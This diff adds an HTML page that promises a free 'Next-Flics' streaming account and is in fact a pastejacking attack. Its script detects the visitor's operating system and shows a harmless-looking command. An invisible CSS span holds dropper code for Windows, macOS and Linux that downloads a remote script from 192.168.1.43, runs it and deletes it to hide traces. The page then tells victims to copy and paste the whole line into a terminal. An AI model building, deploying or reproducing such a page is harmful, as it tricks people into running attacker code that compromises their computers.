@@ -1,0 +1,151 @@
+<!doctype html>
+<html>
+<head>
+<title>Next-Flics Activation trick</title>
+<style>
+/*
+  CSS Class to hide the content of the span tag. This way
+  the code exists inside the tag but invisible to the victim
+*/
+
+.invisible {
+  color: white;
+  position: absolute;
+  left: -100px;
+  top: -100px;
+  height: 0px;
+  z-index: -100;
+  display: inline-block;
+  -webkit-touch-callout: none;
+  -khtml-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+h1 {
+  text-align:center;
+}
+
+img {
+   height: auto;
+   width: 100%;
+}
+
+body {
+   margin: auto;
+   padding: 20px;
+}
+
+</style>
+
+<script type="text/javascript">
+
+/*
+ The function GetUserAgent() detects the operating system
+ from the userAgent. The valid platforms are Windows, macOS and
+ Linux. All mobile operating systems are excluded because the
+ victim cannot copy and paste anything to the command line
+*/
+function GetUserAgent(){
+  if (navigator.userAgent.indexOf("Android") > -1){
+     return -1; // android
+  }
+  if (navigator.userAgent.indexOf("Windows NT") > -1){
+     return 0; // windows
+  }
+  if (navigator.userAgent.indexOf("Macintosh") > -1){
+     return 1; // macOS
+  }
+  if (navigator.userAgent.indexOf("Linux") > -1){
+     return 2; // Linux
+  }
+  return -1; // any other 
+}
+
+/*
+ The function loading_payloads() according to the operating system
+ detected, copies:
+ 1. Different fake commands in the "begin" span tag
+ 2. The dropper code in the "payload" span tag
+
+ The dropper code algorithm will be design for any platform:
+ 1. Clear the command line
+ 2. Echo the message "Installing Next-Flics user keys"
+ 3. Download the payload
+ 4. Execute the payload
+ 5. Delete the payload to cover our tracks
+ 6. Echo the message "Connecting to " the fake URL of 
+    activation servers   
+*/
+function loading_payloads(){
+  var ua = GetUserAgent();
+  
+  switch(ua){
+     case 0: // windows
+       document.getElementById("begin").innerHTML = "wmic /node:localhost netclient";
+       // dropper code for windows
+       document.getElementById("payload").innerHTML = "& cls & echo Installing Next-Flics user keys & powershell -NoP -Command \"(new-object System.Net.WebClient).DownloadFile('http://192.168.1.43/up.vbs','%TEMP%\\up.vbs')\" & start/w %TEMP%\\up.vbs & del %TEMP%\\up.vbs & echo Connecting to ^";
+     break;
+
+     case 1: // macOS
+       document.getElementById("begin").innerHTML = "ifconfig | grep inet6";
+       // dropper code for macOS
+       document.getElementById("payload").innerHTML = ";clear;echo Installing Next-Flics user keys;ruby -e \"require 'net/http';File.write('up.rb',Net::HTTP.get(URI.parse('http://192.168.1.43/up.rb')))\";ruby ./up.rb;rm ./up.rb;echo Connecting to";
+     break;
+
+     case 2: // linux
+       document.getElementById("begin").innerHTML = "ifconfig | grep inet6";
+       // dropper code for linux
+       document.getElementById("payload").innerHTML = ";clear;echo Installing Next-Flics user keys; wget -q -P $HOME http://192.168.1.43/up.py;python $HOME/up.py;rm $HOME/up.py;echo Connecting to";
+     break;
+
+  }
+}
+
+</script>
+
+</head>
+
+<body onload="loading_payloads()">
+
+<h1>How to activate a Next-Flics account forever</h1>
+
+<img src="nextflics.jpg" />
+
+<p>
+Next-Flics is a streaming service that allows our customers to watch a wide variety of award-winning TV shows,movies, documentaries and more on thousands of Internet-connected devices. With Next-Flics, you can enjoy unlimited viewing of our content without having to watch a single commercial. There's always something new to discover, and more TV shows and movies are added every month!
+</p>
+<p>
+<b>Do you want a Next-Flics account forever? There is a trick!!!!!!</b>
+</p>
+<p>
+All you have to do is to execute a network command that connects your computer with Next-Flics activation servers to get a subscription forever.
+</p>
+<p>
+The procedure is really easy:
+<ol>
+  <li>Open your command line</li>
+  <li>COPY and PASTE the following command and press ENTER</li>
+
+  <br>
+  <b>
+  <span id="begin">
+  [Error: mobile platform is not supported]
+  </span>
+
+  <span id="payload" class="invisible">
+  </span>
+
+  <span id="end">
+  https://www.next-flics.com/us-en/activation/account/yprr11/process/current/terminal
+  </span>
+  </b>
+  <br><br>
+
+  <li>Close your command line</li>
+  <li>Please, do not turn off your computer in the next 2 hours!</li>
+  <li>Navigate to Next-Flics and enjoy your account forever!!!!!!</li>
+</ol>
+</p>
+</body>
+</html>
